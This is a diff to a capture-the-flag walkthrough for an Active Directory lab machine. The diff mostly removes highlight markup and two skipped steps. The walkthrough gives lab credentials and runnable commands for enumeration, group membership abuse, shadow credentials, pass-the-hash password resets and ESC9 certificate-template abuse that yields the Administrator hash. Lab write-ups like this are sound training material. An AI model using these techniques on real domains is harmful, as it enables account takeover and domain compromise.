@@ -28,12 +28,12 @@ Password: judith09**
 > **RUN: sudo nmap -Pn -p- \--min-rate 2000 -sC -sV -oN nmap-scan.txt
 > TARGET_IP_OR_HOSTNAME_HERE**
 >
-> **[Alternative:]{.mark}**
+> **Alternative:**
 >
 > **RUN: Nmap -sV -Pn -T4 10.10.11.32 (This scan is more aggressive
 > (faster))**
 >
-> **[INFO:]{.mark} By pushing SPACE key during scan, you can see what's
+> **INFO: By pushing SPACE key during scan, you can see what's
 > going on during the scans**
 >
 > ![](images/media/image3.png)
@@ -63,9 +63,9 @@ Password: judith09**
 >
 > ![](images/media/image5.png)
 >
-> **[Error: Failed to get Kerberos TGT]{.mark}**
+> **Error: Failed to get Kerberos TGT**
 >
-> [Fix Kerberos clock skew issue.]{.mark}
+> Fix Kerberos clock skew issue.
 >
 > **RUN:** **sudo** **ntpdate dc01.certified.htb**
 >
@@ -79,11 +79,11 @@ Password: judith09**
 > ![](images/media/image7.png){width="5.0in"
 > height="1.462810586176728in"}
 >
-> **[(this fixed the ERROR)]{.mark} RUN:** **sudo ntpdate 10.10.11.41**
+> **(this fixed the ERROR) RUN:** **sudo ntpdate 10.10.11.41**
 >
 > ![](images/media/image8.png)
 >
-> **[WORKING]{.mark}** (NO ERRORS) at **2^nd^ Rerun**:
+> **WORKING** (NO ERRORS) at **2^nd^ Rerun**:
 > **bloodhound-python -u judith.mader -p \'judith09\' -c All -d
 > certified.htb -ns 10.10.11.41**
 >
@@ -191,8 +191,8 @@ Password: judith09**
 
 4.  Add **Judith.Mader to the Management group**
 
-> **[INFO: Same Result as in STEP 3, but uses Remote Procedure Call
-> (RPC)]{.mark}**
+> **INFO: Same Result as in STEP 3, but uses Remote Procedure Call
+> (RPC)**
 >
 > **RUN:** **net rpc group addmem \"Management\" \"judith.mader\" -U
 > \"certified.htb\"/\"judith.mader\"%\"judith09\" -S
@@ -260,8 +260,8 @@ Password: judith09**
 > **RUN:** **python3 getnthash.py CERTIFIED.HTB/management_svc -key
 > 5b680911933e7f8641c0bd5b97f8c84185f7cfa75bfdba61d46b0a8f4b00ba62**
 >
-> **INFO:** Download getnthash.py file. **[Paste key from STEP
-> 7]{.mark}**. If python3 command shouldn\'t work, resync clock, see
+> **INFO:** Download getnthash.py file. **Paste key from STEP
+> 7**. If python3 command shouldn\'t work, resync clock, see
 > step 7.
 >
 > **ERROR:** **Kerberos SessionERROR: KRB_AP_ERR_SKEW(Clock skew too
@@ -282,9 +282,9 @@ Password: judith09**
 1.  **PASS THE HASH. NTLM-HASH**. Change password of **CA_Operator
     account**
 
-> **[INFO: 123456789 will be the NEW PASSWORD]{.mark}**
+> **INFO: 123456789 will be the NEW PASSWORD**
 >
-> [**INFO: Paste the NTLM HASH** from **FOOTHOLD STEP 8**]{.mark}
+> **INFO: Paste the NTLM HASH** from **FOOTHOLD STEP 8**
 >
 > **RUN:** **pth-net rpc password \"ca_operator\" \"123456789\" -U
 > \"certified.htb\"/\"management_svc\"%\"a091c1832bcdd4677c28b5a6a1295584\":\"a091c1832bcdd4677c28b5a6a1295584\"
@@ -314,8 +314,8 @@ Password: judith09**
 4.  Get **HASH of CA_OPERATOR** : 89551acff8895768e489bb3054af94fd and
     ca_operator.ccache
 
-> [**INFO: Paste the NTLM HASH** from **BOTTOM OF SCREENSHOT in FOOTHOLD
-> STEP 8**]{.mark}
+> **INFO: Paste the NTLM HASH** from **BOTTOM OF SCREENSHOT in FOOTHOLD
+> STEP 8**
 >
 > **RUN: certipy-ad shadow auto -u management_svc@certified.htb -hashes
 > a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -ns
@@ -337,8 +337,8 @@ Password: judith09**
 6.  Change the **userPrincipalName** of **ca_operator to be
     Administrator**
 
-[**INFO: Paste the NTLM HASH** from **BOTTOM OF SCREENSHOT in FOOTHOLD
-STEP 8**]{.mark}
+**INFO: Paste the NTLM HASH** from **BOTTOM OF SCREENSHOT in FOOTHOLD
+STEP 8**
 
 > **RUN:** **certipy-ad account update -username
 > management_svc@certified.htb -hashes
@@ -350,10 +350,10 @@ STEP 8**]{.mark}
 7.  Now, we request the vulnerable certificate template ESC9 . We must
     **request the certificate as ca_operator**
 
-> **[INFO: Take the hash from result in TERMINAL of STEP 4]{.mark}**
+> **INFO: Take the hash from result in TERMINAL of STEP 4**
 >
-> **[INFO: certified-DC01-CA\' = common name of Certificate Authority
-> (CA)]{.mark}**
+> **INFO: certified-DC01-CA\' = common name of Certificate Authority
+> (CA)**
 >
 > **RUN:** **certipy-ad req -ca \'certified-DC01-CA\' -username
 > ca_operator@certified.htb -hashes c22b315c040ae6e0efee3518d830362b
@@ -378,34 +378,6 @@ STEP 8**]{.mark}
 >
 > ![](images/media/image31.png)
 
-9.  **[SKIP THIS]{.mark}** Once the UPN is changed, **request a
-    certificate to that UPN** .
-
-> **RUN:** **certipy-ad req -username ca_operator@certified.htb
-> -hashes**
->
-> **b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template**
->
-> **CertifiedAuthentication -debug**
->
-> **INFO:** The -ca and -template should be set to correct values which
-> can be found from the certipy
->
-> find command as mentioned above.
->
-> This will create a certificate ( administrator.pfx ), which can be
-> used to authenticate to the
->
-> Domain Controller as the Administrator user.
-
-10. **[SKIP THIS]{.mark}** Before that, the ca_operator user\'s UPN must
-    be changed to the original one.
-
-> **RUN: certipy-ad account update -username
-> management_svc@certified.htb -hashes**
->
-> **a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn
-> ca_operator@certified.htb**
 
 11. Now, if we **try to authenticate with the certificate**, we will
     **receive the NT hash of the Administrator**
